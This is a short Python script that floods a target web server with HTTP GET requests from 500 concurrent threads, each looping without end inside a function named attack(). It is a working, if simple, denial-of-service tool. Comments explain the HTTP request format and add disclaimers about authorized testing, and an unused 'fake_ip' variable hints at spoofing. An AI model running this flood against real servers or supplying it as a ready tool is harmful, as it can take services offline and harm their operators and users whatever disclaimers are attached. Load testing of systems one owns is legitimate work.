import threading
import socket

# Define the target server to simulate a test (ensure it's an authorized and controlled environment).
target = 'example.com'  # Replace with the IP or domain of a target server for authorized testing.
port = 80  # Standard HTTP port.

# Optionally, define a fake IP for demonstration purposes.
fake_ip = '182.121.20.32'

# Function to send HTTP GET requests to the target server
def attack():
    while True:
        try:
            # Create a TCP socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # Establish a connection to the target server and port
            s.connect((target, port))

            # Constructing the HTTP GET request:
            # ------------------------------------
            # The HTTP GET request has the following format:
            # 
            # GET / HTTP/1.1\r\n
            # Host: example.com\r\n
            # Connection: close\r\n
            # \r\n
            # 
            # - `GET / HTTP/1.1`: Specifies the HTTP method (GET), the requested resource (`/` for the root), 
            #   and the protocol version (HTTP/1.1).
            # - `Host: example.com`: The Host header specifies the domain name being accessed. 
            #   This is required in HTTP/1.1 for servers hosting multiple websites (virtual hosts).
            # - `Connection: close`: Informs the server to close the connection after completing the request.
            # - `\r\n`: Indicates the end of a line or header. A blank line (`\r\n`) marks the end of headers.

            # Build the GET request string
            request = f"GET / HTTP/1.1\r\nHost: {target}\r\nConnection: close\r\n\r\n"

            # Send the request encoded as ASCII
            s.send(request.encode('ascii'))

            # Close the socket connection after sending the request
            s.close()
        except Exception as e:
            # Handle any exceptions, such as connection errors
            print(f"Error: {e}")
            break

# Create and start multiple threads to simulate concurrent requests
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()

print("Simulated traffic started (ensure this is in a controlled environment).")
